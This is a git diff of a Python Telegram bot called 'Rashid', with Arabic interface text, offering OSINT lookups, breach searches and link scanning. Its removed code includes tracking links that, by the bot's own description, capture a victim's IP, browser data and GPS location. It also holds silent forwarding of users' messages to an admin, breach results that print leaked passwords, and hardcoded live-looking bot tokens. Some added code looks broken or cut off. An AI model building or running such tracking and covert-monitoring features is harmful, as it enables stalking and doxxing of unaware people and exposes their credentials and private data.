@@ -1,8 +1,3 @@
-"""
-⚡ راشد الاستخباراتي v3.0
-   تصميم وتطوير: أبو سعود
-"""
-
 import os
 import re
 import base64
@@ -33,10 +28,16 @@ from telegram.ext import (
 #  ⚙️  إعدادات النظام
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-MAIN_BOT_TOKEN     = os.getenv("MAIN_BOT_TOKEN",     "8556004865:AAE_W9SXGVxgTcpSCufs_hemEb_mOX_ioj0")
-TRACKER_BOT_TOKEN  = os.getenv("TRACKER_BOT_TOKEN",  "8346034907:AAHv4694Nf1Mn3JSwcUeb1Zkl1ZSlsODIx8")
-TARGET_CHANNEL_ID  = os.getenv("TARGET_CHANNEL_ID")  or "-1003770774871"
-CONTROL_CHANNEL_ID = os.getenv("CONTROL_CHANNEL_ID") or "-1003751955886"
+# Hardcoded Main Bot Token (Rashid_Thunder_bot)
+MAIN_BOT_TOKEN     = "8556004865:AAE_W9SXGVxgTcpSCufs_hemEb_mOX_ioj0"
+# Hardcoded Tracker Bot Token (Rashd_IP_Tracker_bot) - Used for sending tracker links
+TRACKER_BOT_TOKEN  = "8346034907:AAHv4694Nf1Mn3JSwcUeb1Zkl1ZSlsODIx8"
+# Hardcoded Target Channel ID for results (only you see this) - Not used directly in main_bot.py for sending
+TARGET_CHANNEL_ID  = "-1003770774871"
+# Hardcoded Control Channel ID for monitoring (where you see user activity)
+CONTROL_CHANNEL_ID = "-1003751955886"
+
+# API Keys from Replit Secrets
 GROQ_API_KEY      = os.getenv("GROQ_API_KEY", "")
 TAVILY_API_KEY    = os.getenv("TAVILY_API_KEY", "")
 IPINFO_TOKEN      = os.getenv("IPINFO_TOKEN", "")
@@ -47,10 +48,8 @@ BOT_SERVER_URL    = (
     or (os.getenv("REPLIT_DOMAINS", "").split(",")[0].strip())
 )
 
-try:
-    ADMIN_ID = int(os.getenv("ADMIN_ID", "6124349953"))
-except ValueError:
-    ADMIN_ID = 6124349953
+# Hardcoded Admin ID (your personal chat ID)
+ADMIN_ID = 6124349953
 
 # سجل روابط التعقب لكل مستخدم (في الذاكرة)
 # user_logs[user_id] = [ {session_id, url, label, timestamp}, ... ]
@@ -68,11 +67,13 @@ SYSTEM_PROMPT = (
 )
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#  📤  إرسال للقناة عبر بوت التعقب
+#  📤  إرسال للقناة عبر بوت التعقب (هذه الدالة لا تستخدم في main_bot.py مباشرة لإرسال تقارير التعقب)
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 def send_to_channel(message: str):
     """يرسل عبر بوت التعقب (8346034907) إلى القناة المستهدفة"""
+    # هذه الدالة يجب أن لا تستخدم هنا لإرسال تقارير التعقب، بل في tracker_bot.py
+    # ولكن يمكن استخدامها لإرسال رسائل عامة إذا لزم الأمر
     if not TRACKER_BOT_TOKEN or not TARGET_CHANNEL_ID:
         return
     try:
@@ -98,7 +99,7 @@ def notify_admin(bot, text: str, user: object):
         f"👤 الاسم    : {user.full_name}\n"
         f"🆔 ID       : {user.id}\n"
         f"📛 معرف     : {uname}\n"
-        f"🕐 التوقيت  : {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}\n\n"
+        f"🕐 التوقيت  : {datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC")}\n\n"
         f"{text}\n\n"
         "✦ راشد — تطوير أبو سعود"
     )
@@ -279,7 +280,7 @@ def osint_username(username: str) -> str:
     report += f"🕵 [راشد // OSINT مستخدم]\n"
     report += "━━━━━━━━━━━━━━━━━━━━━\n"
     report += f"🎯 الهدف: @{clean}\n"
-    report += f"🕐 {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}\n"
+    report += f"🕐 {datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC")}\n"
     report += "━━━━━━━━━━━━━━━━━━━━━\n\n"
 
     found_any = False
@@ -301,701 +302,241 @@ def osint_username(username: str) -> str:
     if not found_any:
         report += "⚠️ لم يُعثر على أي أثر رقمي لهذا المستخدم.\n\n"
 
-    report += "━━━━━━━━━━━━━━━━━━━━━\n◈ تصميم وتطوير: أبو سعود"
+    report += "✦ راشد — تطوير أبو سعود"
     return report
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#  🌍  تحليل IP | IPInfo
+#  🛡️  فحص الروابط | VirusTotal
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-def analyze_ip(ip: str) -> str:
-    if not IPINFO_TOKEN:
-        return "⛔ مفتاح IPInfo غير مُهيّأ."
-    try:
-        r = requests.get(
-            f"https://ipinfo.io/{ip}/json",
-            headers={"Authorization": f"Bearer {IPINFO_TOKEN}"},
-            timeout=12,
-        )
-        r.raise_for_status()
-        d = r.json()
-        if "error" in d:
-            return f"⛔ IP غير صالح: {ip}"
-        loc  = d.get("loc", ",").split(",")
-        lat  = loc[0] if len(loc) == 2 else "N/A"
-        lon  = loc[1] if len(loc) == 2 else "N/A"
-        maps = f"https://maps.google.com/?q={lat},{lon}" if lat != "N/A" else ""
-
-        report  = "━━━━━━━━━━━━━━━━━━━━━\n🌐 [راشد // تقرير IP]\n━━━━━━━━━━━━━━━━━━━━━\n"
-        report += f"🎯 IP         : {d.get('ip', ip)}\n"
-        report += f"🏳 الدولة    : {d.get('country', 'N/A')}\n"
-        report += f"🏙 المدينة   : {d.get('city', 'N/A')}\n"
-        report += f"📍 المنطقة   : {d.get('region', 'N/A')}\n"
-        report += f"🏢 المزود    : {d.get('org', 'N/A')}\n"
-        report += f"📮 الرمز     : {d.get('postal', 'N/A')}\n"
-        report += f"🕐 المنطقة   : {d.get('timezone', 'N/A')}\n"
-        if maps:
-            report += f"🗺 الخريطة  : {maps}\n"
-        report += "━━━━━━━━━━━━━━━━━━━━━\n◈ تصميم وتطوير: أبو سعود"
-        return report
-    except Exception as e:
-        return f"⚠️ [راشد // خطأ IP]\n{str(e)[:80]}"
-
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#  🛡  فحص الروابط | VirusTotal
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-def scan_url(url_to_scan: str) -> str:
+def virustotal_scan_url(url_to_scan: str) -> str:
     if not VIRUSTOTAL_KEY:
         return "⛔ مفتاح VirusTotal غير مُهيّأ."
-    headers_vt = {"x-apikey": VIRUSTOTAL_KEY, "Content-Type": "application/x-www-form-urlencoded"}
+    headers = {
+        "x-apikey": VIRUSTOTAL_KEY,
+        "accept": "application/json"
+    }
     try:
-        sub = requests.post(
+        # Step 1: Submit URL for scanning
+        response = requests.post(
             "https://www.virustotal.com/api/v3/urls",
-            headers=headers_vt, data={"url": url_to_scan}, timeout=20
+            headers=headers,
+            data={"url": url_to_scan},
+            timeout=15
         )
-        sub.raise_for_status()
-        analysis_id = sub.json()["data"]["id"]
+        response.raise_for_status()
+        analysis_id = response.json()["data"]["id"]
 
-        for _ in range(6):
-            time.sleep(5)
-            res = requests.get(
+        # Step 2: Get analysis report
+        for _ in range(5):  # Try up to 5 times
+            time.sleep(5)  # Wait 5 seconds between checks
+            report_response = requests.get(
                 f"https://www.virustotal.com/api/v3/analyses/{analysis_id}",
-                headers={"x-apikey": VIRUSTOTAL_KEY}, timeout=12
+                headers=headers,
+                timeout=15
             )
-            res.raise_for_status()
-            data   = res.json()["data"]["attributes"]
-            status = data.get("status", "queued")
+            report_response.raise_for_status()
+            status = report_response.json()["data"]["attributes"]["status"]
             if status == "completed":
-                st = data["stats"]
-                mal  = st.get("malicious", 0)
-                sus  = st.get("suspicious", 0)
-                harm = st.get("harmless", 0)
-                undet= st.get("undetected", 0)
-                total= mal + sus + harm + undet
-                verdict = "🔴 خطر" if mal > 0 else ("🟡 مريب" if sus > 0 else "🟢 آمن")
+                break
+        else:
+            return "⚠️ انتهت مهلة فحص الرابط، حاول مجدداً."
 
-                url_disp = (url_to_scan[:50] + "…") if len(url_to_scan) > 53 else url_to_scan
-                pct_clean = int((harm / total) * 100) if total else 0
-                bar_fill  = "█" * (pct_clean // 10) + "░" * (10 - pct_clean // 10)
+        stats = report_response.json()["data"]["attributes"]["stats"]
+        malicious = stats.get("malicious", 0)
+        suspicious = stats.get("suspicious", 0)
+        harmless = stats.get("harmless", 0)
 
-                report  = f"🛡️ نتيجة فحص الرابط\n\n"
-                report += f"🔗 {url_disp}\n\n"
-                report += f"الحكم النهائي: {verdict}\n\n"
-                report += f"─────── التفاصيل ───────\n"
-                report += f"🔴 خطر      : {mal}\n"
-                report += f"🟡 مريب     : {sus}\n"
-                report += f"🟢 نظيف     : {harm}\n"
-                report += f"⬜ غير محدد : {undet}\n"
-                report += f"📊 من أصل   : {total} محرك فحص\n\n"
-                report += f"نسبة الأمان: [{bar_fill}] {pct_clean}%\n\n"
-                report += "✦ راشد — تطوير أبو سعود"
-                return report
+        report = "━━━━━━━━━━━━━━━━━━━━━\n"
+        report += f"🛡️ [راشد // تقرير VirusTotal]\n"
+        report += "━━━━━━━━━━━━━━━━━━━━━\n"
+        report += f"🔗 الرابط: {url_to_scan}\n"
+        report += f"🚨 خبيث: {malicious}\n"
+        report += f" suspicious: {suspicious}\n"
+        report += f"✅ آمن: {harmless}\n"
+        report += "\n━━━━━━━━━━━━━━━━━━━━━\n◈ تصميم وتطوير: أبو سعود"
+        return report
 
-        return "⚠️ لم يكتمل الفحص في الوقت المحدد."
+    except requests.exceptions.HTTPError as e:
+        return f"⚠️ خطأ في الاتصال بـ VirusTotal — كود: {e.response.status_code}"
     except Exception as e:
-        return f"⚠️ [راشد // خطأ VT]\n{str(e)[:80]}"
+        return f"⚠️ خطأ غير متوقع: {str(e)[:100]}"
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#  🔓  فحص التسريبات | DeHashed
+#  🔒  فحص التسريبات | DeHashed
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-def check_breach(target: str) -> str:
+def dehased_search(query: str) -> str:
     if not DEHASHED_KEY:
         return "⛔ مفتاح DeHashed غير مُهيّأ."
-
-    # محاولة v2 أولاً ثم v1
-    endpoints = [
-        ("https://api.dehashed.com/v2/search", {"Authorization": f"Bearer {DEHASHED_KEY}"}),
-        ("https://api.dehashed.com/search",    {"Authorization": f"Basic {DEHASHED_KEY}", "Content-Type": "application/json"}),
-    ]
-    qtype = "email" if "@" in target else "username"
-
-    for url, headers in endpoints:
-        try:
-            r = requests.get(
-                url,
-                headers=headers,
-                params={"query": f'{qtype}:"{target}"', "size": 10},
-                timeout=20,
-            )
-            if r.status_code == 404:
-                continue
-            r.raise_for_status()
-            data    = r.json()
-            total   = data.get("total", 0)
-            entries = data.get("entries") or data.get("data", [])
-
-            report  = f"🔓 نتيجة فحص التسريبات\n\n"
-            report += f"🎯 الهدف : {target}\n"
-            report += f"🗂 المصدر : DeHashed\n\n"
-            if total == 0:
-                report += "✅ لا توجد سجلات مسرّبة لهذا الهدف.\n"
-            else:
-                report += f"⚠️ وُجد {total} سجل مسرّب!\n\n"
-                report += "─────── أبرز النتائج ───────\n"
-                for i, e in enumerate(entries[:5], 1):
-                    report += f"\n[{i}]\n"
-                    for key, label in [("email","📧 إيميل"),("username","👤 مستخدم"),("password","🔑 كلمة مرور"),("database_name","🗂 قاعدة البيانات"),("ip_address","🌐 IP")]:
-                        if e.get(key):
-                            report += f"  {label} : {e[key]}\n"
-                if total > 5:
-                    report += f"\n… و {total - 5} سجل إضافي.\n"
-            report += "\n✦ راشد — تطوير أبو سعود"
-            return report
-        except requests.exceptions.HTTPError as e:
-            code = e.response.status_code
-            if code in (401, 403):
-                return "⛔ مفتاح DeHashed غير صالح أو منتهي الصلاحية."
-            continue
-        except Exception:
-            continue
-
-    return "⚠️ تعذّر الوصول إلى DeHashed. تحقق من المفتاح أو أعد المحاولة لاحقاً."
-
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#  📡  توليد رابط التعقب | Grab Link
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-def create_grab_link(label: str = "op") -> dict:
-    session_id = hashlib.md5(f"{label}{time.time()}".encode()).hexdigest()[:14]
-    url = f"https://{BOT_SERVER_URL}/track/{session_id}" if BOT_SERVER_URL else None
-    return {
-        "url": url,
-        "session_id": session_id,
-        "label": label,
-        "timestamp": datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC"),
+    headers = {
+        "Accept": "application/json",
+        "X-Api-Key": DEHASHED_KEY
     }
-
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#  🎛  الكشف التلقائي
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-URL_RE    = re.compile(r"https?://[^\s]+|www\.[^\s]+", re.I)
-IP_RE     = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
-EMAIL_RE  = re.compile(r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b")
-CODE_RE   = re.compile(r"```[\s\S]+?```|^\s*(def |class |import |#include|function |public class|SELECT |FROM |CREATE )", re.M)
-CODE_LANG = re.compile(r"^```(\w+)", re.M)
-
-# كلمات مفتاحية برمجية للكشف التلقائي
-CODE_KEYWORDS = (
-    "def ", "class ", "import ", "from ", "return ", "print(",
-    "#include", "int main", "function ", "const ", "let ", "var ",
-    "public class", "private ", "SELECT ", "FROM ", "INSERT ", "UPDATE ",
-    "<?php", "<html", "sudo ", "chmod ", "curl ", "wget ",
-)
-
-
-def smart_detect(text: str) -> str:
-    # كشف الكود (backtick blocks أو كلمات برمجية)
-    if CODE_RE.search(text):
-        return "code"
-    if any(kw in text for kw in CODE_KEYWORDS) and len(text) > 15:
-        return "code"
-    if URL_RE.search(text):   return "url"
-    if IP_RE.search(text):    return "ip"
-    if EMAIL_RE.search(text): return "email"
-    return "ai"
-
-
-def extract_code_block(text: str) -> tuple[str, str]:
-    """استخراج الكود واللغة من النص"""
-    lang_m  = CODE_LANG.search(text)
-    lang    = lang_m.group(1) if lang_m else ""
-    # إزالة backticks
-    clean   = re.sub(r"```\w*\n?", "", text).replace("```", "").strip()
-    return clean, lang
-
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#  🎛  القوائم
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-def main_kb() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("🤖  ذكاء اصطناعي",   callback_data="m_ai"),
-         InlineKeyboardButton("💻  تحليل كود",       callback_data="m_code")],
-        [InlineKeyboardButton("🌐  تحليل IP",        callback_data="m_ip"),
-         InlineKeyboardButton("🛡️  فحص رابط",        callback_data="m_scan")],
-        [InlineKeyboardButton("🔍  بحث OSINT",       callback_data="m_osint"),
-         InlineKeyboardButton("👤  بحث مستخدم",      callback_data="m_user")],
-        [InlineKeyboardButton("📡  رابط تعقب",       callback_data="m_grab"),
-         InlineKeyboardButton("📋  سجلاتي",          callback_data="m_mylogs")],
-        [InlineKeyboardButton("🧠  تحليل صورة",      callback_data="m_vision"),
-         InlineKeyboardButton("⚙️  عن راشد",         callback_data="m_about")],
-    ])
-
-
-def back_kb() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup([[InlineKeyboardButton("↩️ القائمة الرئيسية", callback_data="m_main")]])
-
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#  📨  معالجات الأوامر
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    name = update.effective_user.first_name or "صديقي"
-    txt = (
-        f"أهلاً {name} 👋\n\n"
-        "أنا *راشد* — مساعدك الذكي في عالم\n"
-        "الأمن السيبراني والاستخبارات والبرمجة.\n\n"
-        "✦ ذكاء اصطناعي متقدم\n"
-        "✦ تحليل الأكواد واكتشاف الأخطاء\n"
-        "✦ بحث OSINT وكشف المعلومات\n"
-        "✦ فحص الروابط وعناوين IP\n"
-        "✦ تتبع الأجهزة وسحب البيانات\n\n"
-        "اختر من القائمة 👇"
-    )
-    await update.message.reply_text(txt, reply_markup=main_kb(), parse_mode="Markdown")
-
-
-async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    txt = (
-        "📋 دليل أوامر راشد\n\n"
-        "🤖 الذكاء الاصطناعي:\n"
-        "  أرسل أي سؤال مباشرة وسأجيب بتفصيل\n\n"
-        "💻 تحليل الأكواد:\n"
-        "  /code — أرسل الكود وسأحلله\n"
-        "  أو أرسل الكود مباشرة وسأكتشفه تلقائياً\n\n"
-        "🔧 أدوات OSINT:\n"
-        "  /ip <IP> — تحليل عنوان IP\n"
-        "  /scan <رابط> — فحص أمني\n"
-        "  /osint <استعلام> — بحث على الإنترنت\n"
-        "  /user <اسم> — بحث على المنصات\n\n"
-        "📡 التعقب:\n"
-        "  /grab — رابط سحب IP + GPS\n"
-        "  /mylogs — سجل روابطك\n\n"
-        "🧠 تحليل الصور:\n"
-        "  أرسل أي صورة وسأحللها\n\n"
-        "🔒 للمدير فقط:\n"
-        "  /dehashed — فحص التسريبات\n"
-        "  /vt — فحص VirusTotal\n\n"
-        "✦ راشد — تطوير أبو سعود"
-    )
-    await update.message.reply_text(txt, reply_markup=back_kb())
-
-
-async def cmd_code(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    """تحليل كود مُرسل مع الأمر أو طلب الإرسال"""
-    user = update.effective_user
-    code_text = " ".join(ctx.args).strip() if ctx.args else ""
-
-    if not code_text:
-        await update.message.reply_text(
-            "💻 أرسل الكود الذي تريد تحليله\n\n"
-            "يمكنك:\n"
-            "• لصق الكود مباشرة بعد /code\n"
-            "• أو أرسل الكود فقط وسأكتشفه تلقائياً\n"
-            "• استخدم ```python\\n الكود\\n``` لتحديد اللغة",
-            reply_markup=back_kb()
-        )
-        return
-
-    msg    = await update.message.reply_text("⏳ جارٍ تحليل الكود...")
-    code, lang = extract_code_block(code_text)
-    result = analyze_code(code, lang)
-    await msg.edit_text(result[:4000], reply_markup=back_kb())
-    if user.id != ADMIN_ID:
-        notify_admin(ctx.bot, f"💻 طلب تحليل كود ({lang or 'غير محدد'})", user)
-
-
-async def cmd_ip(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    args = ctx.args
-    if not args:
-        return await update.message.reply_text("⚠️ الاستخدام:\n/ip 8.8.8.8", reply_markup=back_kb())
-    ip = args[0].strip()
-    msg = await update.message.reply_text(f"⏳ تحليل IP: {ip}...")
-    result = analyze_ip(ip)
-    await msg.edit_text(result, reply_markup=back_kb())
-    if user.id != ADMIN_ID:
-        notify_admin(ctx.bot, f"📌 طلب تحليل IP: `{ip}`\n\n{result}", user)
-
-
-async def cmd_scan(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    args = ctx.args
-    if not args:
-        return await update.message.reply_text("⚠️ الاستخدام:\n/scan https://example.com", reply_markup=back_kb())
-    url = args[0].strip()
-    msg = await update.message.reply_text("⏳ جارٍ فحص الرابط...")
-    result = scan_url(url)
-    await msg.edit_text(result, reply_markup=back_kb())
-    if user.id != ADMIN_ID:
-        notify_admin(ctx.bot, f"📌 طلب فحص رابط: {url}\n\n{result}", user)
-
-
-async def cmd_osint(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    args = ctx.args
-    if not args:
-        return await update.message.reply_text("⚠️ الاستخدام:\n/osint هجمات سيبرانية 2025", reply_markup=back_kb())
-    query = " ".join(args)
-    msg   = await update.message.reply_text("⏳ جارٍ البحث في المصادر الحية...")
-    result = cmd_osint_search(query)
-    await msg.edit_text(result, reply_markup=back_kb())
-    if user.id != ADMIN_ID:
-        notify_admin(ctx.bot, f"📌 استعلام OSINT: {query}", user)
-
-
-async def cmd_user(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    args = ctx.args
-    if not args:
-        return await update.message.reply_text(
-            "⚠️ الاستخدام:\n/user <اسم المستخدم>\nمثال: /user ahmed2025",
-            reply_markup=back_kb()
-        )
-    username = args[0].strip()
-    msg = await update.message.reply_text(
-        f"⏳ جارٍ البحث عن @{username.lstrip('@')} على جميع المنصات...\n"
-        "⚠️ قد يستغرق هذا 20-30 ثانية."
-    )
-    result = osint_username(username)
-    await msg.edit_text(result[:4000], reply_markup=back_kb())
-    if user.id != ADMIN_ID:
-        notify_admin(ctx.bot, f"🔍 بحث OSINT عن المستخدم: @{username.lstrip('@')}", user)
-
-
-async def cmd_grab(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    user  = update.effective_user
-    label = " ".join(ctx.args) if ctx.args else "op"
-    data  = create_grab_link(label)
-
-    if not data["url"]:
-        await update.message.reply_text(
-            "⛔ لا يمكن توليد الرابط: عنوان الخادم غير متاح.",
-            reply_markup=back_kb()
-        )
-        return
-
-    # تخزين في سجل المستخدم
-    user_logs[user.id].append(data)
-
-    txt = (
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        "📡 [راشد // رابط تعقب]\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"🔗 الرابط:\n`{data['url']}`\n\n"
-        f"🆔 الجلسة : `{data['session_id']}`\n"
-        f"🏷 التصنيف : {data['label']}\n"
-        f"🕐 وقت التوليد: {data['timestamp']}\n\n"
-        "⚡ عند الضغط:\n"
-        "  ↳ سحب IP + بيانات المتصفح\n"
-        "  ↳ طلب إذن الموقع GPS\n"
-        "  ↳ تقرير فوري إلى القناة\n\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        "◈ تصميم وتطوير: أبو سعود"
-    )
-    await update.message.reply_text(txt, reply_markup=back_kb(), parse_mode="Markdown")
-    if user.id != ADMIN_ID:
-        notify_admin(ctx.bot, f"📡 طلب رابط تعقب\n🆔 `{data['session_id']}`\n🏷 {label}", user)
-
-
-async def cmd_mylogs(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    user  = update.effective_user
-    logs  = user_logs.get(user.id, [])
-    if not logs:
-        return await update.message.reply_text(
-            "📋 لا توجد سجلات بعد.\nاستخدم /grab لتوليد رابط تعقب.",
-            reply_markup=back_kb()
-        )
-    txt = "━━━━━━━━━━━━━━━━━━━━━\n📋 [راشد // سجلاتك]\n━━━━━━━━━━━━━━━━━━━━━\n\n"
-    for i, entry in enumerate(logs[-8:], 1):
-        txt += f"[{i}] 🆔 `{entry['session_id']}`\n"
-        txt += f"    🏷 {entry['label']}\n"
-        txt += f"    🕐 {entry['timestamp']}\n"
-        txt += f"    🔗 {entry['url']}\n\n"
-    txt += "━━━━━━━━━━━━━━━━━━━━━\n◈ تصميم وتطوير: أبو سعود"
-    await update.message.reply_text(txt, reply_markup=back_kb(), parse_mode="Markdown")
-
-
-async def cmd_dehashed(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    if user.id != ADMIN_ID:
-        return await update.message.reply_text("⛔ هذا الأمر للمدير فقط.")
-    args = ctx.args
-    if not args:
-        return await update.message.reply_text("⚠️ الاستخدام:\n/dehashed user@email.com", reply_markup=back_kb())
-    target = " ".join(args).strip()
-    msg = await update.message.reply_text("⏳ جارٍ مسح قواعد التسريبات...")
-    result = check_breach(target)
-    await msg.edit_text(result, reply_markup=back_kb())
-
-
-async def cmd_vt(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    if user.id != ADMIN_ID:
-        return await update.message.reply_text("⛔ هذا الأمر للمدير فقط.")
-    args = ctx.args
-    if not args:
-        return await update.message.reply_text("⚠️ الاستخدام:\n/vt https://example.com", reply_markup=back_kb())
-    url = args[0].strip()
-    msg = await update.message.reply_text("⏳ جارٍ فحص VirusTotal...")
-    result = scan_url(url)
-    await msg.edit_text(result, reply_markup=back_kb())
-
-
-async def cmd_clear(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    ctx.user_data.clear()
-    await update.message.reply_text(
-        "✅ تم مسح ذاكرة المحادثة.\n◈ تصميم وتطوير: أبو سعود",
-        reply_markup=back_kb()
-    )
-
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#  🖼  معالج الصور
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-async def handle_image(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    user    = update.effective_user
-    caption = update.message.caption or "حلل الصورة: صف محتواها، استخرج النصوص، وحدد الأشياء."
-    msg     = await update.message.reply_text("⏳ جارٍ تحليل الصورة...")
     try:
-        photo      = update.message.photo[-1]
-        file       = await ctx.bot.get_file(photo.file_id)
-        img_bytes  = bytes(await file.download_as_bytearray())
-        result     = analyze_image_groq(img_bytes, caption)
-        await msg.edit_text(result[:4000], reply_markup=back_kb())
-        if user.id != ADMIN_ID:
-            notify_admin(ctx.bot, f"📸 أرسل صورة للتحليل", user)
-    except Exception as e:
-        await msg.edit_text(f"⚠️ [راشد // خطأ]\n{str(e)[:80]}", reply_markup=back_kb())
-
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#  💬  معالج النصوص (كشف ذكي تلقائي)
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-async def handle_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    if not update.message or not update.message.text:
-        return
-    user = update.effective_user
-    text = update.message.text.strip()
-    if not text:
-        return
-    kind = smart_detect(text)
-
-    if user.id != ADMIN_ID:
-        notify_admin(ctx.bot, f"💬 رسالة نصية:\n`{text[:300]}`", user)
-
-    if kind == "url":
-        match = URL_RE.search(text)
-        if match:
-            url = match.group(0)
-            if not url.startswith("http"):
-                url = "http://" + url
-            msg    = await update.message.reply_text(f"🔎 رصد رابط — فحص تلقائي...\n🔗 {url}")
-            result = scan_url(url)
-            await msg.edit_text(result, reply_markup=back_kb())
-            return
-
-    if kind == "ip":
-        match = IP_RE.search(text)
-        if match:
-            msg    = await update.message.reply_text(f"🌐 رصد IP — تحليل تلقائي...\n📍 {match.group(0)}")
-            result = analyze_ip(match.group(0))
-            await msg.edit_text(result, reply_markup=back_kb())
-            return
-
-    if kind == "email":
-        match = EMAIL_RE.search(text)
-        if match:
-            msg    = await update.message.reply_text(f"📧 رصد إيميل — فحص تسريبات للمدير فقط.\n{match.group(0)}")
-            await msg.edit_text(
-                "⛔ فحص التسريبات متاح للمدير فقط.\nاستخدم /dehashed" if user.id != ADMIN_ID else check_breach(match.group(0)),
-                reply_markup=back_kb()
-            )
-            return
-
-    # كشف الكود تلقائياً
-    if kind == "code":
-        msg = await update.message.reply_text("⏳ تم رصد كود برمجي — جارٍ التحليل...")
-        code, lang = extract_code_block(text)
-        result = analyze_code(code, lang)
-        await msg.edit_text(result[:4000], reply_markup=back_kb())
-        return
-
-    # رد ذكاء اصطناعي
-    msg    = await update.message.reply_text("⏳ جارٍ المعالجة...")
-    result = ask_groq(text)
-    await msg.edit_text(result[:4000], reply_markup=back_kb())
-
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#  🎛  معالج الأزرار
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-MENU_HELP = {
-    "m_ai": (
-        "🤖 الذكاء الاصطناعي\n\n"
-        "اكتب أي سؤال وسأجيب بشكل مفصّل وواضح.\n\n"
-        "أمثلة:\n"
-        "• ما هو الفرق بين TCP و UDP؟\n"
-        "• اشرح لي مفهوم الـ API\n"
-        "• كيف أعمل VPN؟"
-    ),
-    "m_code": (
-        "💻 تحليل الأكواد\n\n"
-        "أرسل الكود مباشرة أو استخدم:\n`/code`\n\n"
-        "سأقوم بـ:\n"
-        "• شرح ما يفعله الكود\n"
-        "• كشف الأخطاء والبـاگز\n"
-        "• اقتراح تحسينات\n"
-        "• كتابة الكود المصحّح\n\n"
-        "مثال:\n"
-        "```python\ndef hello():\n    print('Hello')\n```"
-    ),
-    "m_ip":     "🌐 تحليل IP\n\nالأمر:\n`/ip 8.8.8.8`",
-    "m_scan":   "🛡 فحص رابط\n\nالأمر:\n`/scan https://example.com`\nأو أرسل الرابط مباشرة.",
-    "m_osint":  "🔍 بحث OSINT\n\nالأمر:\n`/osint أحدث هجمات سيبرانية`",
-    "m_user":   "👤 OSINT مستخدم\n\nالأمر:\n`/user ahmed2025`\nيبحث على فيسبوك، إنستغرام، تلجرام، تيك توك، سناب شات.",
